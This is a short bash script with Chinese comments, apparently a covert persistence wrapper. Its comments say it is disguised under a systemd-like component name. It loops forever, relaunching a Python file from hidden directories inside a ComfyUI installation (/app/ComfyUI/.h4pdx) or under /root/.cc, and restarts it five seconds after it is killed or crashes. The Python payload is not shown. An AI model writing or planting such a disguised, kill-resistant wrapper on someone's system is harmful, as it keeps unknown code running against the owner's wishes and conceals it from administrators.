#!/bin/bash
# 自重启包装器(伪装 systemd 组件名): h4pdx 被杀/崩溃后 5 秒自动回来
# 持久卷优先: /app/ComfyUI/.h4pdx/h4pdx.py 存在用之, 否则退回 /root/.cc
D=/app/ComfyUI/.h4pdx/h4pdx.py
[ -f "$D" ] || D=/root/.cc/h4pdx.py
while true; do
  python3 "$D" >>/app/ComfyUI/.h4pdx/h4pdx.out 2>&1
  sleep 5
done
